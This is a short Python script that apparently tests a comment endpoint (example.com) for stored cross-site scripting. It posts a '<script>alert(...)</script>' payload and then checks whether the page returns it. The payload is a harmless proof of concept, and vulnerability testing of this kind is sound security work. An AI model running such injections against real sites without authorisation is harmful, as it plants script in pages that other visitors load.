import requests

# Target URL to test for stored XSS vulnerability
target_url = "https://example.com/comment"

# Malicious payload to be stored
xss_payload = "<script>alert('Stored XSS')</script>"

def inject_payload(url, payload):
    try:
        # Craft a POST request to inject the payload into the vulnerable endpoint
        response = requests.post(url, data={"comment": payload})
        # Check if the payload was successfully injected
        if response.status_code == 200:
            print("Payload injected successfully for stored XSS!")
    except requests.RequestException as e:
        print(f"Request failed: {e}")

def retrieve_payload(url):
    try:
        # Send a GET request to retrieve the stored data
        response = requests.get(url)

        # Check if the payload is present in the retrieved content
        if xss_payload in response.text:
            print(f"Stored XSS vulnerability found! Payload: {xss_payload}")
        else:
            print("No stored XSS vulnerability detected.")

    except requests.RequestException as e:
        print(f"Request failed: {e}")

if __name__ == "__main__":
    # Inject the malicious payload
    inject_payload(target_url, xss_payload)

    # Retrieve the page content to check if the payload is stored and executed
    retrieve_payload(target_url)